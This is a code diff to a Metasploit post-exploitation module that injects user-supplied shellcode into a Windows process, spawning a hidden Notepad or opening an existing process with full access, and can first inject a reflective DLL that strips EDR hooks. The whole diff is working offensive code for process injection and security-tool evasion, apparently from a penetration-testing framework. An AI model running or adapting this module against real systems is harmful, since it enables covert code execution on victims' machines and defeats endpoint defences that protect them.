@@ -4,11 +4,10 @@
 ##
 
 require 'msf/core/post/common'
-require 'msf/core/post/windows/reflective_dll_injection'
 
 class MetasploitModule < Msf::Post
   include Msf::Post::Common
-  include Msf::Post::Windows::ReflectiveDLLInjection
+  include Msf::Post::Windows::Process
 
   def initialize(info={})
     super( update_info( info,
@@ -26,10 +25,10 @@ class MetasploitModule < Msf::Post
       [
         OptPath.new('SHELLCODE', [true, 'Path to the shellcode to execute']),
         OptInt.new('PID', [false, 'Process Identifier to inject of process to inject the shellcode. (0 = new process)', 0]),
-        OptBool.new('CHANNELIZED', [true, 'Retrieve output of the process', true]),
-        OptBool.new('INTERACTIVE', [true, 'Interact with the process', true]),
+        OptBool.new('CHANNELIZED', [true, 'Retrieve output of the process', false]),
+        OptBool.new('INTERACTIVE', [true, 'Interact with the process', false]),
         OptBool.new('HIDDEN', [true, 'Spawn an hidden process', true]),
-        OptBool.new('AUTOUNHOOK', [true, 'Auto remove EDRs hooks', true]),
+        OptBool.new('AUTOUNHOOK', [true, 'Auto remove EDRs hooks', false]),
         OptInt.new('WAIT_UNHOOK', [true, 'Seconds to wait for unhook to be executed', 5]),
         OptEnum.new('BITS', [true, 'Set architecture bits', '64', ['32', '64']])
       ])
@@ -37,7 +36,6 @@ class MetasploitModule < Msf::Post
 
   # Run Method for when run command is issued
   def run
-
     # syinfo is only on meterpreter sessions
     print_status("Running module against #{sysinfo['Computer']}") if not sysinfo.nil?
 
@@ -52,116 +50,70 @@ class MetasploitModule < Msf::Post
       bits = ARCH_X86
     end
 
+    # prelim check
+    if client.arch == ARCH_X86 and @payload_arch == ARCH_X64
+      fail_with(Failure::BadConfig, "Cannot inject a 64-bit payload into any process on a 32-bit OS")
+    end
+
+    # Start Notepad if Required
     if pid == 0
-      p = create_temp_proc(bits)
-      print_status("Spawned process #{p.pid}")
+      notepad_pathname = get_notepad_pathname(bits, client.sys.config.getenv('windir'), client.arch)
+      vprint_status("Starting  #{notepad_pathname}")
+      proc = client.sys.process.execute(notepad_pathname, nil, {
+        'Hidden' => datastore['HIDDEN'],
+        'Channelized' => datastore['CHANNELIZED'],
+        'Interactive' => datastore['INTERACTIVE']
+      })
+      print_status("Spawned Notepad process #{proc.pid}")
     else
       if not has_pid?(pid)
         print_error("Process #{pid} was not found")
         return false
       end
-      p = client.sys.process.open(pid.to_i, PROCESS_ALL_ACCESS)
-      print_status("Opening process #{p.pid}")
+      begin
+        proc = client.sys.process.open(pid.to_i, PROCESS_ALL_ACCESS)
+      rescue Rex::Post::Meterpreter::RequestError => e
+        print_error(e.to_s)
+        fail_with(Failure::NoAccess, "Failed to open pid #{pid.to_i}")
+      end
+      print_status("Opening existing process #{proc.pid}")
     end
 
+    # Check
     if bits == ARCH_X64 and client.arch == ARCH_X86
       print_error("You are trying to inject to a x64 process from a x86 version of Meterpreter.")
       print_error("Migrate to an x64 process and try again.")
       return false
-    elsif arch_check(bits, p.pid)
+    elsif arch_check(bits, proc.pid)
       if datastore['AUTOUNHOOK']
-        inject_unhook(p, bits)
-      end
-
-      inject(shellcode, p)
-    end
-  end
-
-  # Checks the Architeture of a Payload and PID are compatible
-  # Returns true if they are false if they are not
-  def arch_check(bits, pid)
-    # get the pid arch
-    client.sys.process.processes.each do |p|
-      # Check Payload Arch
-      if pid == p["pid"]
-        print_status("Process found checking Architecture")
-        if bits == p['arch']
-          print_good("Process is the same architecture as the payload")
-          return true
-        else
-          print_error("The PID #{ p['arch']} and Payload #{bits} architectures are different.")
-          return false
+        print_status("Executing unhook")
+        print_status("Waiting #{datastore['WAIT_UNHOOK']} seconds for unhook Reflective DLL to be executed...")
+        unless inject_unhook(proc, bits, datastore['WAIT_UNHOOK'])
+          fail_with(Failure::BadConfig, "Unknown target arch; unable to assign unhook dll")
         end
       end
-    end
-  end
-
-  # Creates a temp notepad.exe to inject payload in to given the payload
-  # Returns process PID
-  def create_temp_proc(bits)
-    windir = client.sys.config.getenv('windir')
-    # Select path of executable to run depending the architecture
-    if bits == ARCH_X86 and client.arch == ARCH_X86
-      cmd = "#{windir}\\System32\\notepad.exe"
-    elsif bits == ARCH_X64 and client.arch == ARCH_X64
-      cmd = "#{windir}\\System32\\notepad.exe"
-    elsif bits == ARCH_X64 and client.arch == ARCH_X86
-      cmd = "#{windir}\\Sysnative\\notepad.exe"
-    elsif bits == ARCH_X86 and client.arch == ARCH_X64
-      cmd = "#{windir}\\SysWOW64\\notepad.exe"
-    end
-
-    proc = client.sys.process.execute(cmd, nil, {
-      'Hidden' => datastore['HIDDEN'],
-      'Channelized' => datastore['CHANNELIZED'],
-      'Interactive' => datastore['INTERACTIVE']
-    })
-
-    return proc
-  end
-
-  def inject_unhook(p, bits)
-    if bits == ARCH_X64
-      dll_file_name = 'x64.dll'
-      vprint_status("Assigning payload ext_server_unhook.x64.dll")
-    elsif bits == ARCH_X86
-      dll_file_name = 'x86.dll'
-      vprint_status("Assigning payload ext_server_unhook.x86.dll")
-    else
-      fail_with(Failure::BadConfig, "Unknown target arch; unable to assign unhook dll")
-    end
-
-    dll_file = MetasploitPayloads.meterpreter_ext_path('unhook', dll_file_name)
-    print_status("Injecting unhook Reflective DLL into process ID #{p.pid}")
-    dll, offset = inject_dll_into_process(p, dll_file)
-    print_status("Executing unhook")
-    p.thread.create(dll + offset, 0)
-    print_status("Waiting #{datastore['WAIT_UNHOOK']} seconds for unhook Reflective DLL to be executed...")
-    Rex.sleep(datastore['WAIT_UNHOOK'])
-  end
-
-  def inject(shellcode, p)
-    print_status("Injecting shellcode into process ID #{p.pid}")
-    begin
-      print_status("Allocating memory in process #{p.pid}")
-      mem = inject_into_process(p, shellcode)
-      print_status("Allocated memory at address #{"0x%.8x" % mem}, for #{shellcode.length} byte shellcode")
-      p.thread.create(mem, 0)
-      print_good("Successfully injected payload into process: #{p.pid}")
-
-      if datastore['INTERACTIVE'] && datastore['CHANNELIZED'] && datastore['PID'] == 0
-        print_status("Interacting")
-        client.console.interact_with_channel(p.channel)
-      elsif datastore['CHANNELIZED'] && datastore['PID'] == 0
-        print_status("Retrieving output")
-        data = p.channel.read
-        print_line(data) if data
-      elsif datastore['CHANNELIZED'] && datastore['PID'] != 0
-        print_warning("It's not possible to retrieve output when injecting existing processes.")
+      begin
+        inject(shellcode, proc)
+      rescue ::Exception => e
+        print_error("Failed to inject Payload to #{proc.pid}!")
+        print_error(e.to_s)
       end
-    rescue ::Exception => e
-      print_error("Failed to inject Payload to #{p.pid}!")
-      print_error(e.to_s)
+    end
+  end
+
+  def inject(shellcode, proc)
+    mem = inject_into_process(proc, shellcode)
+    proc.thread.create(mem, 0)
+    print_good("Successfully injected payload into process: #{proc.pid}")
+    if datastore['INTERACTIVE'] && datastore['CHANNELIZED'] && datastore['PID'] == 0
+      print_status("Interacting")
+      client.console.interact_with_channel(proc.channel)
+    elsif datastore['CHANNELIZED'] && datastore['PID'] == 0
+      print_status("Retrieving output")
+      data = proc.channel.read
+      print_line(data) if data
+    elsif datastore['CHANNELIZED'] && datastore['PID'] != 0
+      print_warning("It's not possible to retrieve output when injecting existing processes.")
     end
   end
 end
